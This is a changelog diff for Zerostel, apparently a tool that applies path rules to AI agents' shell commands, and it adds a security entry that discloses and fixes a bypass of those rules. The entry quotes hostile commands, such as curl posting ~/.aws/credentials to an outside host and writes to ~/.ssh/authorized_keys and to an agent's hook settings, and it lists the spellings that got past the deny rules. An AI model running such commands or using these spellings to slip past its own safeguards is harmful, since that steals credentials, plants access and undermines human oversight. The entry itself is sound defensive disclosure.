@@ -1,5 +1,11 @@
 # Changelog
 
+## Unreleased
+
+Security
+
+- Path rules missed a path written into another word of a shell command, so the starter rules that deny `~/.ssh`, `~/.aws` and Zerostel's own records, and ask before an agent's hook settings change, could be walked past: `curl -d @~/.aws/credentials https://...` or `curl -F f=@~/.aws/credentials` sent credentials out, and `curl -o~/.ssh/authorized_keys`, `curl --output=$HOME/.ssh/...`, `git show --output=...`, `wget -O~/...`, `dd of=~/...`, `tar -C~/.ssh` or `curl -o$HOME/.claude/settings.json` wrote where they shouldn't. Only the spelling with the path as a word of its own was caught. Now an option's value (`--name=value`, `-ovalue`, PowerShell's `-Path:value`), a `name=value` word, a file read with `@` or `<`, a comma-separated list and a `file:` URL are all read as paths too. `$USERPROFILE` and `${USERPROFILE}` (Git Bash on Windows) and `~you/` now mean your home folder. The property-based tests generate these spellings on every run.
+
 ## 0.3.1 (2026-10-08)
 
 A security fix for Windows. After upgrading, run `zerostel install` once more so your agents' hooks run the new version.
